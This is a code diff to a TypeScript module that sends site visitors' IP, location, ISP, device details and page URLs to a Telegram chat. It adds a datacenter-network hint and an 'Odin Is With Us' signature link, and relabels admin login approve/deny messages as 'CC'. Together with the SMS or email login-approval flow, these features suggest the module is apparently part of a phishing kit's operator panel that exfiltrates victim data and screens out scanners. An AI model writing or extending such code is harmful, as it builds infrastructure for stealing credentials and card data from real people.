@@ -1,3 +1,4 @@
+import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
 // Get Telegram configuration from environment variables
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
 // TELEGRAM_CHAT_ID: one id, or several comma-separated (e.g. "111,222,333")
@@ -20,6 +21,8 @@ export interface VisitorTelegramData {
   ip: string
   timezone: string
   isp: string
+  asn?: string | null
+  org?: string | null
   userAgent: string
   screen: string
   language: string
@@ -100,6 +103,7 @@ function asPre(value: unknown): string {
 }
 
 export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
+  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
   const site = escapeTelegramHtml(data.siteName)
   const message =
     `\n🌐 <b>New Visitor (${site})</b>\n` +
@@ -107,14 +111,17 @@ export async function sendVisitorNotification(data: VisitorTelegramData): Promis
     `📍 <b>Location:</b> ${asCode(data.location)}\n` +
     `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
     `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
-    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n\n` +
+    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n` +
+    (networkHint ? `🛡️ <b>Network:</b> ${asCode(networkHint)}\n` : '') +
+    `\n` +
     `📱 <b>Device:</b>\n${asPre(data.userAgent)}\n` +
     `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
     `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
     `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
     `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
     `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
-    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`
+    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}` +
+    `\n<a href="https://t.me/th3_allfather">Odin Is With Us</a>`
 
   return await sendTelegramMessage(message, { disableWebPagePreview: false })
 }
@@ -132,7 +139,7 @@ export async function sendFormNotification(data: FormData & { [key: string]: any
   // 1c) Admin login approval
   else if (data.type === 'admin_login_approve') {
     const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
-    message = `✅ <b>Admin – Login Approved</b>
+    message = `✅ <b>CC – Login Approved</b>
 ━━━━━━━━━━━━━━━━━━
 👤 User ID: ${asCode((data as { userId?: string }).userId)}
 📧 Method: ${asCode(methodLabel)}
@@ -142,7 +149,7 @@ ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data
   // 1d) Admin login denial
   else if (data.type === 'admin_login_deny') {
     const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
-    message = `❌ <b>Admin – Login Denied</b>
+    message = `❌ <b>CC – Login Denied</b>
 ━━━━━━━━━━━━━━━━━━
 👤 User ID: ${asCode((data as { userId?: string }).userId)}
 📧 Method: ${asCode(methodLabel)}
